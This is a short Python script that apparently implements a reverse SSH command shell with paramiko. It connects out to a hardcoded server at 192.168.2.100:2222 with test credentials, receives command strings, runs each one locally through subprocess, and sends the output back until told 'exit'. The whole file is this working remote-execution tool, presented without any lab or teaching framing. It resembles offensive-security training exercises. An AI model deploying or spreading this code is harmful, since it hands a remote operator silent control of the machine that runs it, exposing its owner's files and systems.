#!/bin/python3

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.sendall(command)
    print(ssh_session.recv(1024).decode())
    while True:
        command = ssh_session.recv(1024)
        try:
            cmd = command.decode()
            if cmd == 'exit':
                client.close()
                break
            cmd_output = subprocess.check_output(shlex.split(cmd))
            ssh_session.sendall(cmd_output or 'okay')
        except FileNotFoundError:
            ssh_session.sendall(f"command not found: {cmd}")
        except Exception as e:
            ssh_session.sendall(str(e))
            client.close()
    return
    
if __name__ == '__main__':
    import getpass

    user = 'test'
    password = 'test'
    ip = '192.168.2.100'
    port = 2222
    ssh_command(ip, port, user, password, 'ClientConnected')
    # -----------------------------------------------------------
    # user = getpass.getuser()
    # password = getpass.getpass()
    # ip = input('Enter server IP: ')
    # port = input('Enter port: ')
    # ssh_command(ip, port, user, password, 'ClientConnected')